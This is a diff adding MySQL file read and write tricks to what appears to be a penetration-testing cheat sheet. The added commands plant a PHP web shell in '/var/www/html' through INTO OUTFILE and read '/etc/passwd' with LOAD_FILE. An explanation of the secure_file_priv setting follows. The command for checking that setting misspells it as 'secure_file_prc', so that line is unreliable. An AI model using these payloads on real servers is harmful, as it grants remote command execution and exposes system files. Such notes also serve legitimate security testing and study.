@@ -1,4 +1,22 @@
 -- -
+### Write Local File
+```mysql
+SELECT "<file contents>" INTO OUTFILE '<path>';
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+### Read Local File
+```mysql
+SELECT LOAD_FILE("<path>");
+select LOAD_FILE("/etc/passwd");
+```
+### Secure File Priv
+`secure_file_priv` is a global variable that effects data import and export operations such as the above output file operation. Main areas of effect:
+- If set to a directory, the server limits import and export to the specified directory, so you can only read or write files to that specific directory.
+- If set to NULL the server disables import and export operations
+- If empty, there is no effect. So you can read or write files from wherever on the server with no limitations. 
+```mysql
+show variables like "secure_file_prc";
+```
 #### General Commands
 ```mysql
 # Note: the caps are optional, can do either.
